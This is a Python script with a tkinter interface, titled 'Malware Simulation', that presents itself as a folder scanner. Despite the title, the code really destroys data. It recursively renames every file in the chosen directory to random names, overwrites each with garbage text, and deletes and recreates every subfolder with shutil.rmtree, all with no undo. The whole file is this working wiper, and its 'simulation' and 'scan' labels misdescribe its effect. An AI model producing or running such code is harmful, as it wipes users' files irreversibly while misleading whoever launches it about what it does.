import os
import shutil
import logging
import random
import string
import tkinter as tk
from tkinter import filedialog, messagebox

logging.basicConfig(filename='malware_simulation.log', level=logging.INFO, 
                    format='%(asctime)s - %(message)s')

def generate_random_filename(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + ".txt"

def replace_file_with_garbage(file_path):
    try:
        with open(file_path, 'w') as f:
            f.write("HAHAHAHA I AM MALWARE JHKGGYGHVT")
        logging.info(f'Replaced file with garbage: {file_path}')
    except Exception as e:
        logging.error(f'Error replacing file: {file_path} - {e}')

def replace_folder_with_garbage(folder_path):
    try:
        shutil.rmtree(folder_path)
        os.makedirs(folder_path)
        for i in range(3):
            file_name = os.path.join(folder_path, f'placeholder_{i}.txt')
            replace_file_with_garbage(file_name)
        logging.info(f'Replaced folder with garbage: {folder_path}')
    except Exception as e:
        logging.error(f'Error replacing folder: {folder_path} - {e}')

def rename_file(file_path):
    directory, old_name = os.path.split(file_path)
    new_name = generate_random_filename()
    new_file_path = os.path.join(directory, new_name)
    os.rename(file_path, new_file_path)
    logging.info(f'Renamed file {old_name} to {new_name}')
    return new_file_path

def scan_and_replace(root_dir, target_file="hi.txt"):
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            file_path = os.path.join(root, file)
            new_file_path = rename_file(file_path)
            replace_file_with_garbage(new_file_path)

        for dir in dirs:
            folder_path = os.path.join(root, dir)
            replace_folder_with_garbage(folder_path)

def start_scan():
    root_dir = folder_entry.get()
    specific_file = file_entry.get()

    if not root_dir:
        messagebox.showerror("Error", "Please select a folder to scan.")
        return

    scan_and_replace(root_dir)

    if specific_file and os.path.exists(specific_file):
        replace_file_with_garbage(specific_file)
    else:
        logging.info(f"File not found or not specified: {specific_file}")

    messagebox.showinfo("Completed", "Scan and replacement completed.")

def browse_folder():
    folder_selected = filedialog.askdirectory()
    folder_entry.delete(0, tk.END)
    folder_entry.insert(0, folder_selected)

def browse_file():
    file_selected = filedialog.askopenfilename()
    file_entry.delete(0, tk.END)
    file_entry.insert(0, file_selected)

# Setup the GUI
root = tk.Tk()
root.title("Malware Simulation")

frame = tk.Frame(root)
frame.pack(padx=20, pady=20)

folder_label = tk.Label(frame, text="Select Folder to Scan:")
folder_label.grid(row=0, column=0, sticky="w")
folder_entry = tk.Entry(frame, width=40)
folder_entry.grid(row=0, column=1)
browse_folder_btn = tk.Button(frame, text="Browse", command=browse_folder)
browse_folder_btn.grid(row=0, column=2)

file_label = tk.Label(frame, text="Specific File (optional):")
file_label.grid(row=1, column=0, sticky="w")
file_entry = tk.Entry(frame, width=40)
file_entry.grid(row=1, column=1)
browse_file_btn = tk.Button(frame, text="Browse", command=browse_file)
browse_file_btn.grid(row=1, column=2)

start_btn = tk.Button(root, text="Start Scan", command=start_scan)
start_btn.pack(pady=10)

root.mainloop()

